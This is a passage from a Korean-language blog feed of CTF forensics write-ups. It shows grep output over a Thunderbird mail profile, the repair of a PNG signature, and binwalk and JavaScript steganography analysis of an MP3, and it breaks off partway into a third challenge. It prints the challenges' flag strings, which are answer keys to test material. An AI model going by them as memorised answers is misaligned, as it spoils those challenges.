+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Spam.msf:    &lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;threadCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;ordinal&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;flaggedCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Starred.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash:Subject: flag
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;AA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flag&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;AB
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Trash.msf:    &lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;threadCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;ordinal&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;flaggedCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Archives.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Drafts.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX:Subject: flag
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;label&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;statusOfset&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;numLines&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/INBOX.msf:    &lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;threadCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;ordinal&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;flaggedCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Sent.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/Templates.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Binary file ./client01/.thunderbird/5bd7jhog.default/kinto.sqlite matches
+./client01/.thunderbird/5bd7jhog.default/Mail/Local Folders/Trash.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/Mail/Local Folders/Unsent Messages.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/panacea.dat:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns:msg:db:table:kind:folders&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;82&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;key&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;totalMsgs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Binary file ./client01/.thunderbird/5bd7jhog.default/places.sqlite matches
+Binary file ./client01/.thunderbird/5bd7jhog.default/secmod.db matches
+./client01/.xsession-errors:    &lt;span class=&quot;s1&quot;&gt;'su'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bus_name, flags&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+./client01/.xsession-errors.old:    &lt;span class=&quot;s1&quot;&gt;'su'&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bus_name, flags&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;.thunderbird 파일 내에서 e-mail과 관련된 항목에서 해당 flag 문자열이 식별되는 것을 확인할 수 있었다. thunderbird 파일을 살펴본다. &lt;code class=&quot;highlighter-rouge&quot;&gt;inbox&lt;/code&gt; 항목 내에서 flag 라는 제목으로 수신된 email을 확인할 수 있으며, link 를 하나 식별할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/inbox.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] inbox mail&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;해당 링크 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.filehosting.org/file/details/720884/file&lt;/code&gt;로 접속하면, 아래와 같이 download link를 redirect 할 mail을 입력할 수 있다.
+&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/filedown1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] file download1&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;본인의 mail 주소를 넣고, inbox 함을 확인한 결과 file download를 수행할 수 있는 link를 받을 수 있었으며, 해당 파일을 정상적으로 download 할 수 있었다.
+&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/filedown2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] file download2&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;download 받은 파일에 대해 확인해보면, data stream으로 식별되나 hex 값을 통해 signature가 손상된 PNG 파일임을 알 수 있다.
+&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/file_information.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] file information&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;올바른 signature 값으로 offset을 수정한 뒤, 해당 이미지를 열어보면 Flag을 식별할 수 있었다. (조금 잘려서 보이지만 식별하는데에는 이상이 없다.)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/fixed.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] signature fix&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] flag&lt;/i&gt;&lt;/p&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;SharifCTF{43215f0c5e005d4e557ddfe3f2e57df0}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_Sharif" /><category term="Forensic" /><category term="Writeup" /><category term="string" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_AceBear_CTF] JS (999)</title><link href="http://localhost:4000/ctf/AceBear-CTF-JS-999/" rel="alternate" type="text/html" title="[2018_AceBear_CTF] JS (999)" /><published>2018-02-09T00:00:00+09:00</published><updated>2018-02-09T00:00:00+09:00</updated><id>http://localhost:4000/ctf/AceBear-CTF-JS-999</id><content type="html" xml:base="http://localhost:4000/ctf/AceBear-CTF-JS-999/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Challenge Description: Let listen to the best song of this month.
+Download: Link
+Author: komang4130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-JS-999/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Forensic/MISC 분야에서 나왔던 문제, 풀이자가 상당히 적고 나도 당시엔 풀지 못한 문제인데.. 너무 어이 없이 해결해서 당황스럽다..&lt;/p&gt;
+
+&lt;p&gt;link를 통해서 받은 파일을 확인해보면, mp3 파일을 하나 확인할 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS
+ file ./Hey_Stranger.mp3
+./Hey_Stranger.mp3: Audio file with ID3 version 2.4.0
+ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS
+ exiftool ./Hey_Stranger.mp3
+ExifTool Version Number         : 10.55
+File Name                       : Hey_Stranger.mp3
+Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+File Size                       : 4.7 MB
+File Modification Date/Time     : 2018:01:27 14:11:55+09:00
+File Access Date/Time           : 2018:02:08 21:26:36+09:00
+File Inode Change Date/Time     : 2018:01:27 14:13:20+09:00
+File Permissions                : rw-r--r--
+File Type                       : MP3
+File Type Extension             : mp3
+MIME Type                       : audio/mpeg
+MPEG Audio Version              : 1
+Audio Layer                     : 3
+Audio Bitrate                   : 128 kbps
+Sample Rate                     : 44100
+Channel Mode                    : Stereo
+MS Stereo                       : Off
+Intensity Stereo                : Off
+Copyright Flag                  : False
+Original Media                  : False
+Emphasis                        : None
+ID3 Size                        : 1415670
+Copyright                       : Vega
+Title                           : Người Lạ Ơi
+Genre                           : Rap / Hip Hop Việt
+Artist                          : Karik, Orange
+Album                           :
+User Defined Text               : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;author&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Châu Đăng Khoa
+Encoder Settings                : Lavf56.40.101
+Picture MIME Type               : image/png
+Picture Type                    : Other
+Picture Description             : Hey Stranger - Karik - Orange
+Picture                         : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Binary data 1415401 bytes, use &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; option to extract&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Duration                        : 0:03:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;approx&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;대회 당시, binary가 mp3 파일로 주어졌기 때문에 MP3stego 등을 이용하거나, Spectrum, GoldWave 등으로 Audio Steganography로 접근했었다. 하지만 전혀 관계없다… &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;로 파일 내 데이터를 추출하면, 아래와 같이 Thumbnail로 저장되어 있는 이미지 파일을 하나 확인할 수 있다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/JS
+binwalk ./Hey_Stranger.mp3
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+259           0x103           PNG image, 1366 x 1000, 8-bit/color RGBA, non-interlaced
+300           0x12C           Zlib compressed data, compressed
+4103003       0x3E9B5B        lrzip compressed data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-JS-999/info.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] Binwalk information&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;혹시 몰라, 대회 당시엔 해당 png 파일에 대해 추출하고 OpenStego 돌려보고, LSB 확인하고 등의 작업을 많이 수행했었는데 바보 같았던게 문제에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;JS&lt;/code&gt; 라는 단어를 언급하고 있던 점을 전혀 생각하지 않았던 것이다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;javascript&lt;/code&gt; image steganography 에 대해서 찾아보니, 바로 관련된 자료가 나왔고.. 해당 thumbnail을 올려 unhide 해보니.. 바로 Flag 확인..(상당히 어이가 없었다.. 풀이자도 2-3팀 정도였던 걸로 기억하는데, 너무 간단한 문제였다..)
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-JS-999/unhide.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] unhide Thumbnail&lt;/i&gt;&lt;/p&gt;
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;AceBear{!!!!!BoA_Luffy_1s_Real!!!!!}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_acebear" /><category term="Forensic" /><category term="MISC" /><category term="Writeup" /><category term="javascript" /><category term="steganography" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_AceBear_CTF] My idol(975)</title><link href="http://localhost:4000/ctf/AceBear-CTF-My-idol-975/" rel="alternate" type="text/html" title="[2018_AceBear_CTF] My idol(975)" /><published>2018-02-09T00:00:00+09:00</published><updated>2018-02-09T00:00:00+09:00</updated><id>http://localhost:4000/ctf/AceBear-CTF-My-idol-975</id><content type="html" xml:base="http://localhost:4000/ctf/AceBear-CTF-My-idol-975/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Challenge Description: Trying to listen and maybe you know his name, and you’ll know one of his secret weapons . Something that he deleted from Michael Hansen may help you get in.
+Download: Link
+Author: komang4130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Download link 를 통해 받은 파일을 확인해보면, 하나의 ape 파일을 확인할 수 있다. (&lt;code class=&quot;highlighter-rouge&quot;&gt;call_him.ape&lt;/code&gt;)
+&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-My-idol-975/exiftool.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exiftool - call_him.ape&lt;/p&gt;
+
